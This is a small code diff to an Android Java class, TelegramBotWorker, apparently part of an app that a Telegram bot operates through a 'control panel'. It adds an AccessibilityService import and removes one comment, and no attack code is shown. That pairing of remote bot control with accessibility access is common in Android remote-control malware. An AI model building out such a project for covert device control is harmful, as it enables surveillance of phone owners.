@@ -1,5 +1,6 @@
 package com.chimera;
 
+import android.accessibilityservice.AccessibilityService;
 import android.content.Context;
 import android.content.Intent;
 import android.content.pm.ApplicationInfo;
@@ -201,7 +202,7 @@ public class TelegramBotWorker implements Runnable {
                     break;
                 case "BACK_TO_MAIN":
                     sendControlPanel(chatId);
-                    editMessage(chatId, messageId, "Control panel closed.", context); // Close old panel
+                    editMessage(chatId, messageId, "Control panel closed.", context);
                     break;
                 case "EXIT_PANEL":
                     editMessage(chatId, messageId, "Control panel closed.", context);
